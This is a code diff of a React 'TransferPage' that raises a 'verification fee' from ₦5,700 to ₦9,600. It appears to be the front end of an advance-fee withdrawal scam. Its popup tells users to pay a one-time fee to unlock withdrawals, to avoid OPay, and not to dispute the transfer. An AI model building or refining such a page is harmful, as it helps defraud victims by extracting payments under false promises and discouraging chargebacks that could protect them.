@@ -104,7 +104,7 @@ const TransferPage = () => {
               <p className="text-4xl font-bold text-yellow-400">₦9,600</p>
               <Copy
                 className="w-5 h-5 text-yellow-400 cursor-pointer hover:text-yellow-300"
-                onClick={() => copyToClipboard("5700")}
+                onClick={() => copyToClipboard("9600")}
               />
             </div>
             <p className="text-xs text-gray-400">Verification Fee</p>
@@ -150,7 +150,7 @@ const TransferPage = () => {
             {/* Important Notice */}
             <div className="bg-yellow-50/10 border border-yellow-400 rounded-lg p-4 mt-4 backdrop-blur-md">
               <p className="text-sm text-yellow-300 font-medium">
-                ⚠️ Important: Transfer exactly ₦5,700 to the account above to
+                ⚠️ Important: Transfer exactly ₦9,600 to the account above to
                 verify your withdrawal request.
               </p>
             </div>
@@ -171,7 +171,7 @@ const TransferPage = () => {
         <div className="fixed top-20 right-4 z-50 w-80 bg-gradient-to-br from-purple-900 via-black to-purple-800 text-white rounded-2xl shadow-xl overflow-hidden animate-slideIn">
           {/* Header */}
           <div className="flex justify-center items-center p-3 border-b border-purple-700/50 relative">
-            <span className="font-bold text-lg text-center">PAY NGN 5700</span>
+            <span className="font-bold text-lg text-center">PAY NGN 9600</span>
             <button
               onClick={() => setShowPopup(false)}
               className="absolute right-3 top-3"
@@ -185,7 +185,7 @@ const TransferPage = () => {
             {[
               "DO NOT USE OPAY TO MAKE TRANSFER",
               "DO NOT DISPUTE ANY TRANSFER MADE TO OUR SERVICES IT MAY CAUSE WITHDRAW PROBLEMS",
-              "THIS IS A ONE TIME PAYMENT OF 5700 FOR YOUR ACCOUNT VERIFICATION",
+              "THIS IS A ONE TIME PAYMENT OF 9600 FOR YOUR ACCOUNT VERIFICATION",
               "AFTER PAYMENT YOUR ACCOUNT WILL BE VERIFIED FOR WITHDRAWALS",
               "TRANSFER ONLY THE EXACT AMOUNT TO PREVENT SERVER ISSUES"
             ].map((text, index) => (
